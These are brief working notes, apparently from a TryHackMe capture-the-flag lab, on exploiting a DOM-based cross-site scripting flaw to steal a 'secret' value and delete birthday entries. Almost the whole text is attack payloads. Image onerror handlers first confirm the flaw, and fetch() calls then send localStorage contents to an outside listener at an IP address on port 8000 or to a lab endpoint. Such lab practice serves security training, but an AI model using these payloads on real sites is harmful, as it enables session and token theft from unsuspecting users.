how to delete all birthdays
-> to get to know `?secret=` value 
-> using DOM xss ? 

~https://realwebsite.com#<img src=1 onerror=alert(document.secret)></img>
=> checking the dom xss attack is working 
=> using this how to know the secret value ? 
document.secret? 

~https://realwebsite.com#<img src=1 onerror="fetch('http://10.10.104.193:8000?secret=' + localStorage.getItem('secret'))"></img>

~<img src=1 onerror="fetch('http://10.10.104.193:8000' + localStorage.getItem('secret'))">

~https://realwebsite.com#<img src = 1 onerror=alert(localStorage.getItem('secret'))>

~https://realwebsite.com#<img src=1 onerror=alert(panda)></img>


~<img src=1 onerror="window.location='http://lists.tryhackme.loc:5001/ping'">

~<img src=1 onerror="fetch('http://lists.tryhackme.loc:5173/bdays/45e358301c6946548b72d15c3e2ab797?secret=' + localStorage.getItem('secret'))">

~http://lists.tryhackme.loc:5173/bdays/45e358301c6946548b72d15c3e2ab797?secret=
